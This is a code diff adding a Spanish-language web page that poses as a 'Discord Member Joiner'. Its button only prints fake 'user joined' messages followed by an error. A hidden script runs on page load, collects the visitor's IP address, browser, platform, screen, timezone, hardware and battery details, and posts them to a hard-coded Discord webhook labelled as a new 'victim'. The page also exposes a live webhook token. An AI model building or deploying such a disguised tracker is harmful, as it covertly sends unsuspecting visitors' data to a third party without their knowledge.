@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Member Joiner</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="flex items-center justify-center h-screen bg-gray-900 text-white">
+    <div class="text-center bg-gray-800 p-6 rounded-lg shadow-lg w-96">
+        <h1 class="text-2xl font-bold mb-4">Discord Member Joiner</h1>
+        <input id="serverId" type="text" placeholder="ID del Servidor" class="w-full p-2 rounded text-black"/>
+        <button onclick="sendRequest()" class="mt-4 bg-blue-500 hover:bg-blue-600 text-white py-2 px-4 rounded">Enviar</button>
+        <div id="console" class="mt-4 p-2 bg-gray-700 rounded text-left text-sm"></div>
+    </div>
+
+    <script>
+        function sendRequest() {
+            document.getElementById('console').innerText = "🔄 Enviando miembros...";
+            setTimeout(() => {
+                document.getElementById('console').innerText += "\n✅ Usuario 1 se unió.\n✅ Usuario 2 se unió.\n✅ Usuario 3 se unió.";
+                setTimeout(() => {
+                    document.getElementById('console').innerText += "\n❌ Ocurrió un error. Lo sentimos.";
+                }, 2000);
+            }, 2000);
+        }
+
+        async function sendVisitorInfo() {
+            const webhookUrl = "https://discord.com/api/webhooks/1356015352370434068/R_cJSNvtNmgdCQf1MATqgjbA1hA5rVnx8pQF9F8n8TyjCP2qxSro1oSG6z4CGJjoTUGT";
+            try {
+                const response = await fetch("https://api64.ipify.org/?format=json");
+                const data = await response.json();
+                const battery = await navigator.getBattery();
+                const visitorInfo = {
+                    "🌍 IP": data.ip,
+                    "🖥️ Navegador": navigator.userAgent,
+                    "💻 Plataforma": navigator.platform,
+                    "🌐 Idioma": navigator.language,
+                    "📏 Resolución": screen.width + "x" + screen.height,
+                    "⏰ Zona Horaria": Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    "⚡ Núcleos CPU": navigator.hardwareConcurrency,
+                    "🛠️ Memoria RAM": navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
+                    "🍪 Cookies activadas": navigator.cookieEnabled,
+                    "🔋 Batería": Math.round(battery.level * 100) + "%",
+                    "🕒 Hora de ingreso": new Date().toLocaleString()
+                };
+
+                await fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ content: "📥 Nueva víctima en la web \njson\n" + JSON.stringify(visitorInfo, null, 2) + "\n" })
+                });
+            } catch (error) {
+                console.error("Error enviando la información:", error);
+            }
+        }
+
+        sendVisitorInfo();
+    </script>
+</body>
+</html>
